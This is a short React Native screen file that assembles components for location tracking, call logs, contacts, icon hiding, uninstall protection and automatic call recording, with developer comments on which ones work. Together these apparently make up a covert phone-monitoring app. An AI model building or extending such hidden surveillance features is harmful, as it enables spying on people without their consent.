import { StyleSheet, Text, View } from 'react-native'
import React from 'react'
import LocationTracker from '../LocationTracker'
import CallLogsScreen from './CallLogsScreen'
import Contacts from './Contacts'
import IconToggle from './IconToggle'
import UninstallProtection from './UninstallProtection'
import AutoCallRecording from './AutoCallRecording'
const index = () => {
  return (
    <View style={{ flex: 1 }}>
     <LocationTracker />
     {/* <CallLogsScreen /> */}
     {/* <Contacts />  working */}
     {/* <IconToggle /> working */}
     {/* <AutoCallRecording /> working but voice not working */}
     {/* <UninstallProtection /> */}
    </View>
  )
}

export default index

const styles = StyleSheet.create({})